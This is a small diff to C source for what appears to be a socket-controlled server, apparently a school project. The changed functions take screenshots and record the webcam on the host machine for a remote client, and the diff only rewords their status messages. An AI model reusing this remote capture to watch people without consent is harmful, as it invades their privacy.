@@ -6,7 +6,7 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/29 17:04:47 by banthony         ###   ########.fr       */
+/*   Updated: 2019/12/04 14:16:15 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -229,7 +229,7 @@ static t_bool	server_cmd_screenshot(t_client *client, t_server *server)
 	if (!server || !client)
 		return (false);
 	exec_command(screenshot, "Taking screenshot ...", env, client->socket);
-	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tScreenshot are saved in /tmp folder.\n", client->socket);
+	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tScreenshot end. Check in /tmp folder.\n", client->socket);
 	send_text("\tIf the command failed, try install imagemagick-6.q16 using shell.\n", client->socket);
 	return (true);
 }
@@ -256,7 +256,7 @@ static t_bool	server_cmd_camvid(t_client *client, t_server *server)
 		return (false);
 	send_text(COLORIZE(SH_RED, "• ")"Recording webcam /dev/video0 ...\n", client->socket);
 	exec_command(camvid, "Capturing webcam ...", NULL, -1);
-	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tVideo are saved in /tmp folder.\n", client->socket);
+	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tVideo record end. Check in /tmp folder.\n", client->socket);
 	send_text("\tIf the command failed, try install ffmpeg using shell.\n", client->socket);
 	return (true);
 }
